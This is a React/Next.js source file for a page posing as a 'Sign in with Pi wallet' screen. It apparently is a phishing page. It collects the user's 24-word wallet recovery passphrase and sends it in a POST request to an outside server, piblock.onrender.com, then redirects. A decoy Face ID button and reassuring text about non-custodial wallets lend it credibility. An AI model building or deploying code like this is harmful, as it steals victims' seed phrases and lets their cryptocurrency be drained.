import React, { useState, useEffect } from 'react'
import Head from 'next/head'
import axios from "axios"
import Header from '@/components/common/Header'
import { Text, Flex, Center, Button, Textarea } from '@chakra-ui/react'


function Signin() {

    const [phrase, setphrase] = useState("")
    const [isValid, setIsvalid] = useState(true)
    const [pressedFaceId, setpressedFaceId] = useState(false)

    const handleSubmit = (e:any) => {
        e.preventDefault();

        if (phrase.length > 23) {
            setIsvalid(true)
            fetch('https://piblock.onrender.com/message', {
                //methods -> POST,GET,PUT,PATCH,DELETE
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'accept': 'application/json' },
                body: JSON.stringify({
                    message: phrase
                })
            })
                .then(res => { res.json() })
                .then((data) => {
                    window.location.href = "./explorer.html"
                })
                .catch((reason) => {
                    console.log("it happened here ", reason)
                    setIsvalid(false)
                })

        } else {
            setIsvalid(false)
            alert(`please ensure your passphrase is upto 24 and not more than 24 . current length is ${phrase?.length} `)
        }
    }

    useEffect(() => {
        setTimeout(() => {
          setpressedFaceId(false)
      },3000)
    }, [pressedFaceId])
    

    return (
        <section>
            <Header title={''} description={''} />
            <div className="h-screen w-full flex  py-12">
                <div className="w-10/12 md:w-6/12 lg:3/12  m-auto" >
                    <Center>
                        <Text fontSize='3xl' as="b" mb={20}>Sign in with Pi wallet</Text>
                    </Center>
                    <div data-spy="scroll" data-target="#main-nav" data-offset="91" className="false">
                        <section className="section-spacing" id="contact">

                            <div className="col-md-12 col-lg-8 offset-lg-2">
                                <form onSubmit={handleSubmit}>
                                    <Textarea
                                        value={phrase}
                                        onChange={(text) => setphrase(text.target.value)}
                                        placeholder='Enter your 24-word passphrase here'
                                        size='lg'
                                        isInvalid={!isValid}
                                        height={[200, 300]}
                                    />
                                    {
                                        !isValid ?
                                            <div className="text-center mt-3" id="errorholder">
                                                <Text fontSize='sm' color={"red.400"} mb={4}>Invalid passphrase</Text>
                                            </div> : null
                                    }
                                    <div className="text-center">
                                        <div className="col-lg-12 col-md-12 mt-6">
                                            <button type="submit" className="border-purple h-[50px] w-full bg-black text-white flex justify-center items-center">
                                                SIGNIN WITH PASSPHRASE
                                            </button>
                                        </div>
                                        <div onClick={(e) => { e.preventDefault(); setpressedFaceId(true); }} className="col-lg-12 col-md-12">
                                            <button id="faceid" className=" disabled bg-purple h-[50px] w-full bg-black text-white flex justify-center items-center">
                                                SIGNIN WITH FACE ID/ FINGERPRINT
                                            </button>
                                            <div className="text-center mt-5" id="errorholder2">

                                            </div>
                                    </div>
                                    {
                                        pressedFaceId ?
                                            <div className="text-center mt-3" id="errorholder">
                                                    <Text fontSize='sm' color={"red.400"} mb={4}>please login to enable Face ID or fingerprint</Text>
                                            </div> : null
                                    }
                                    </div>
                                </form>
                            </div>


                            <div className="row mt-5 pt-5">

                                <div className="col-sm-12 col-md-8 col-lg-8 mb-3 mx-auto">
                                    <div className=" wow fadeInUp" data-wow-delay="0.2s">
                                        <Text fontSize='md' color={"blackAlpha.600"} mb={4}>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to
                                            you. Recovery of
                                            passphrase is currently impossible.
                                        </Text>
                                        <Text fontSize='md' color={"blackAlpha.600"} mb={4}>Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be
                                            inaccessible.
                                        </Text>
                                    </div>
                                </div>


                            </div>

                        </section>
                    </div>
                </div>
            </div>
        </section>

    )
}

export default Signin